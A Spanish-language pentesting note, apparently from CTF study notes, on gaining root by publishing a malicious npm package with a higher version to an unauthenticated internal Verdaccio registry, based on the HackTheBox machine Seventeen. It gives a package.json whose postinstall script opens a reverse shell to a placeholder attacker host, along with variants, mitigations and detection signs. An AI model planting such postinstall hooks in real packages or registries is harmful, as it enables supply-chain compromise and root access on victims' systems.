---
topic: npm — módulo malicioso en un registro interno
tags: [linux, npm, supply-chain, postinstall, verdaccio, seventeen]
---

# npm — módulo malicioso en un registro interno

[🌐 English](malicious-npm-module.en.md) | **Español**

## Concepto

npm ejecuta scripts de ciclo de vida (`preinstall`, `install`, `postinstall`) al instalar un paquete. Si un atacante puede publicar en el registro que usa la víctima, con el mismo nombre y una versión superior a una dependencia, el siguiente `npm install` ejecutará su código. En un servicio que instala como root, el resultado es ejecución como root.

En Seventeen, Verdaccio servía paquetes internos y un `startup.sh` ejecutaba `npm install` como root; publicar un `loglevel` malicioso con `postinstall` daba root.

## Cuándo aplica

- Registro npm interno accesible y sin autenticación fuerte.
- La aplicación instala dependencias en cada arranque o despliegue.
- `package.json` usa rangos (`^`, `~`) y no hay lockfile íntegro.
- El proceso de instalación corre como root.
- En Seventeen, el registro estaba en `4873` y el script de arranque era de root.

## Procedimiento

1. Identificar el registro (`npm config get registry`, `.npmrc`, `4873`).
2. Comprobar si permite publicar sin autenticación.
3. Crear un paquete con el nombre de una dependencia y versión superior.
4. Añadir un `postinstall` que ejecute el payload.
5. Publicar y esperar al siguiente `npm install`.
6. Verificar la ejecución y la reverse shell.

## Comandos

```bash
npm config set registry http://127.0.0.1:4873/
npm whoami
```

```json
{
  "name": "loglevel",
  "version": "99.9.9",
  "scripts": {
    "postinstall": "bash -c 'bash -i >& /dev/tcp/<ATTACKER>/443 0>&1'"
  }
}
```

```bash
npm publish --registry http://127.0.0.1:4873/
```

## Variantes

- Dependency confusion: publicar el nombre de un paquete privado en el registro público.
- `preinstall` para ejecutar antes de resolver dependencias.
- Modificar un paquete legítimo si el registro permite sobrescribir versiones.
- Usar `node -e` en el script para evitar depender de `bash`.

## Limitaciones

- El registro puede exigir autenticación para publicar.
- Un lockfile con integridad (`integrity`) impide cambiar la versión.
- `npm ci` y `--ignore-scripts` bloquean el `postinstall`.
- La versión publicada debe satisfacer el rango de la dependencia.

## Mitigación

- Autenticar y autorizar la publicación en el registro interno.
- Usar lockfiles con `integrity` y `npm ci`.
- Ejecutar `npm install --ignore-scripts` cuando sea posible.
- Instalar como usuario sin privilegios y en un contenedor efímero.
- Auditar dependencias y monitorizar publicaciones nuevas.

## Detección

- Paquetes nuevos o versiones anómalas en el registro.
- Scripts `postinstall` que ejecutan shells o descargan binarios.
- `npm install` como root y procesos hijos inesperados.
- Conexiones salientes durante la instalación.

## Referencias

- [npm — Lifecycle scripts](https://docs.npmjs.com/cli/v10/using-npm/scripts#life-cycle-scripts)
- [Verdaccio — Security](https://verdaccio.org/docs/security/)
- [0xdf — Seventeen](https://0xdf.gitlab.io/2026/02/14/htb-seventeen.html)
- [Ficha Seventeen](../../machines/linux/seventeen/README.md)
